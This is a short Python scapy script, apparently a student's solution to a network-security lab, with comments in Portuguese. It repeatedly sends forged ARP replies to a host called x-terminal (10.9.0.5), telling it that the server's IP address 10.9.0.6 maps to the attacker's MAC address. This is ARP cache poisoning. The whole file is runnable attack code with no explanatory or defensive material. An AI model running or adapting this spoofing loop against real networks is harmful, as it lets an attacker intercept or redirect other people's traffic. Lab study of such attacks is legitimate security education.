from scapy.all import *
from time import sleep

a = ARP()

a.op = 2
# eu sou o server
a.psrc = '10.9.0.6'
a.hwsrc = '02:42:cd:d3:ec:9f'
# x-terminal eh x-terminal
a.pdst = '10.9.0.5'
a.hwdst = '02:42:0a:09:00:05'

# Atualizar a tabela ARP do x-terminal indicando que o MAC do server é o do atacante!
while True:
    send(a)
    sleep(0.1)
